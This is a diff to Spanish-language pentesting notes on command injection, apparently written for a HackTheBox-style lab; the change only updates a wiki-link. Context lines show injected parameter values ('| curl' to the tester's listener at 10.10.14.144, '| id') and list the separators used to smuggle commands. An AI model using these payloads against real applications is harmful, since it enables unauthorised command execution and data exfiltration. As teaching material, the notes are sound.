@@ -69,7 +69,7 @@ curl: (6) Could not resolve host: doesnotexist.htb
 var params = `webapp_selector=${encodeURIComponent("| curl -k https://10.10.14.144:4443?pwn")}`;
 ```
 
-Si llega la petición a nuestro servidor, hay ejecución de comandos. El separador que funcione (`|`, `;`, `&&`, `$()`, backticks) depende de cómo concatene la entrada la app —dentro de comillas, como argumento de una opción, etc.—, así que conviene probar varios. A partir de ahí se explota como cualquier [[Command Injection|command injection]], exfiltrando la salida:
+Si llega la petición a nuestro servidor, hay ejecución de comandos. El separador que funcione (`|`, `;`, `&&`, `$()`, backticks) depende de cómo concatene la entrada la app —dentro de comillas, como argumento de una opción, etc.—, así que conviene probar varios. A partir de ahí se explota como cualquier [[00 - Introducción a Command Injection|command injection]], exfiltrando la salida:
 
 ```js
 var params = `webapp_selector=${encodeURIComponent("| id")}`;
